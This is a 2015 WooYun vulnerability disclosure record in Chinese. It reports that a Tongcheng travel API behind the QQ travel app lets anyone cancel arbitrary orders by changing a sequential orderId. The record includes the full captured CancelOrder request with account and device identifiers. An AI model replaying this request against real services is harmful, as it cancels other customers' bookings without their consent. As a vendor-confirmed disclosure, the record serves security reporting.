{"id": 83795, "wybug_id": "wooyun-2015-0146752", "wybug_title": "同程旅游网某接口可取消任意订单", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "Focusstart", "wybug_date": "2015-10-14 18:19", "wybug_open_date": "2015-11-28 19:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误", "同程旅游网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向公众公开  简要描述： 腾讯的APP，但是接口是同程的。。肉疼。。。没乌币还川神了。。。 详细说明：  首先，我们打开QQ旅游网http://travel.go.qq.com/v2/home.html点击下载最新app\n\n   漏洞证明：  安装完成\n\n下单之后有取消订单按钮\n\n点击取消订单，抓包\nPOST /qqtravelappapi/api/Order/CancelOrder HTTP/1.1Content-Type: application/json;charset=utf-8User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.2; Coolpad 9150 Build/JZO54K)Host: txapi.ly.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 354{\"body\":{\"nickName\":\"testtest\",\"orderId\":1730501,\"userId\":123946913},\"clientInfo\":{\"deviceId\":\"990003157996618\",\"refid\":\"35899326\",\"versionNumber\":\"v4.3.0\",\"versionType\":\"Android\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"digitalSign\":\"592e505e8830c16750d17cf3ad907cfcdb61135a\",\"reqTime\":\"2015-10-13 23:29:03\",\"version\":\"2014.6.13\"}}\n虽然有Sign，但是没用直接修改orderId即可取消任意订单且发现订单id是递增的，根据下单的id可发现还是有一定订单数的返回成功\n\n   修复方案：  权限控制   版权声明：转载请注明来源 Focusstart@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-10-14 19:13 厂商回复： 感谢关注同程旅游。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-14 18:45 |    \t\tFocusstart  \t\t\t( 普通白帽子  |\t\t\t        Rank:681 漏洞数:184        | 努力让某某某成为最幸福的女人！)\t\t \n  …小厂商了…    \n     2016-01-19 17:08 |    \t\tphoenixne \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:46        | 小本毕业，向各位学习)\t\t \n  @Focusstart 还送JD卡吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}